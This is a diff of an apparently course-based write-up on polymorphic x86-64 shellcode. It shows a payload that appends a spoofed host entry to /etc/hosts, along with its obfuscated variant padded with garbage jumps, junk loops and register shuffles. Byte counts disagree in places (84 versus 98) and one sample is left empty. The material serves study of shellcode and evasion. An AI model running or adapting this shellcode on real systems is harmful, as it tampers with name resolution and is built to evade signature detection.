@@ -152,7 +152,7 @@ push 0x09
 pop rsi        ==>       inc rsi
 ```
 
-### Sample 2: 
+### Sample 2: `Add map in /etc/hosts file` 
 ---
 
 * Shellcode Name: Add map in /etc/hosts file
@@ -161,7 +161,7 @@ pop rsi        ==>       inc rsi
 * Description: Adds entry in the `/etc/hosts` file
 * Original Shellcode Size: 110 bytes
 * Max Size of the polymorphic Version: 165 bytes
-* Size of the Created Polymorphic Version: **44 bytes for V1 and XX for V2 (below the 150%)**
+* Size of the Created Polymorphic Version: **84 bytes for V1 and XX for V2 (below the 150%)**
 
 The original ASM file:
 ```asm
@@ -212,20 +212,30 @@ data:
 ```
 
 The following techniques are applied to polymorph the code:
-1. Replace the Stack Technique used to store the `/etc/hosts` string by Relative Address Technique
-2. Replace the JMP-CALL-POP by Relative Address 
-3. Lot of `mov` instructions that can be replaced by `jmp;pop`
-4. Several `add` after a `xor` that can be replaced by `push;pop`
-The polymorphic code results in a reduced version of 84 bytes:
+- Replace the Stack Technique used to store the `/etc/hosts` string by Relative Address Technique
+- Replace the JMP-CALL-POP by Relative Address 
+- Lot of `mov` instructions that can be replaced by `jmp;pop`
+- Several `add` after a `xor` that can be replaced by `push;pop`
+
+Doing this, the polymorphic code results in a reduced version of **84 bytes**. [Sample_2_Polymorph_V1.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_2_Polymorph_V1.nasm) file in the [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment06), contains the code for this first version
+
+That size leaves space to add more "dumb" instructions to obfuscate the code:
+- Add `push` and `pop` anywhere in the code using registers that won't interfer in the code
+- Move location of instructions to parts of code where does not affect
+- Creating "dumb" bucles over the code
+- Add some `nop`
+- Place `jmp` around modifying the code flow widdth same results
+
+With all those tricks, the final code has **98 bytes** size. **This is a reduced size from the original shellcode**. The code ends being this:
 ```asm
 global _start
     section .text
 
 _start:
 
-        jmp real_start
-        text db "127.1.1.1 google.lk"   ; 19 bytes
-        path db "/etc/hosts", 0x00      ; 10 bytes
+	jmp real_start
+    text db "127.1.1.1 google.lk"   ; 19 bytes
+    path db "/etc/hosts", 0x00      ; 10 bytes
 
 real_start:
 
@@ -233,19 +243,43 @@ real_start:
     push 2
     pop rax
     ; Instead the stack for the string, use rel addressing
-    lea rdi, [rel path]
-    push 0x401
-    pop rsi
-    syscall
+    lea rdi, [rel text]
+	push rdi
+	pop r9
+	push rdi
+	pop rdi
+	add rdi, 19
+    xor rsi, rsi
+    add si, 0x401
+    ; Garbage jump
+    jmp some_jump_1
 
+some_jump_2:
+    syscall
+	
+    ; Garbage jump
+    jmp some_jump_3
+    nop
     ;write
+
+    ; Garbage jump
+some_jump_1:
+    jmp some_jump_2
+	
+some_jump_3:
     push rax
     pop rdi
-    xor rax, rax
-    inc rax
+
+    push 1
+    pop rax
 
 write:
-    lea rsi, [rel text]
+    ;lea rsi, [rel text]
+	push r9
+	pop rsi
+
+garbage_jump_2:
+
     push 19
     pop rdx
     syscall
@@ -255,12 +289,23 @@ write:
     pop rax
     syscall
 
+	; Garbage
+garbage_jump_3:				; Lot of garbage
+	push 10					; Just a bucle
+	pop rcx
+garbage_jump_3_loop:
+	push 60
+	pop rax
+	loop garbage_jump_3_loop
+	; End Garbage
+
     ;exit
-    push 60
-    pop rax
     xor rdi, rdi
     syscall
 ```
+### Sample 3:
+---
+
 
 
 
@@ -269,11 +314,11 @@ write:
 ---
 The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment04) for this assignment contains the following files:
 
-- [Encoder.c](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Encoder.c) : This C file is the implementation of the Encoder Scheme. Prints out a encoded shellcode.
-- [Decode-Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Decode-Execve-Stack.nasm) : This is the NULL free code for the Egg Hunter.
-- [Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment4/ReverseShell-ExecveStack_V2.nasm) : This is the code for the shellcode to use in the PoC.
-- [shellcode.c](https://github.com/galminyana/SLAE64/blob/main/Assignment04/shellcode.c) : The C template Decode-Execve-Stack.nasm Shellcode, ready to compile and execute
-
+- [Sample_1_Original.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_1_Original.nasm) : Contains the original code for the first sample shellcode, `sethostname() & killall 33`
+- [Sample_1_Polymorph.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_1_Polymorph.nasm) : Polymorph version for the `sethostname() & killall` shellcode.
+- [Sample_2_Original.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment6/Sample_2_Original.nasm) : Contains the original code for the second sample shellcode, `Add map in /etc/hosts file`
+- [Sample_2_Polymorph_V1.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_2_Polymorph_V1.nasm) : V1 of the polymorphed code for the `Add map in /etc/hosts file`.
+- [Sample_2_Polymorph_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_2_Polymorph_V2.nasm) : As the V1 left us bytes to play, created this second version even more obfuscated for th `Add map in /etc/hosts file`.
 
 ### The End
 ---
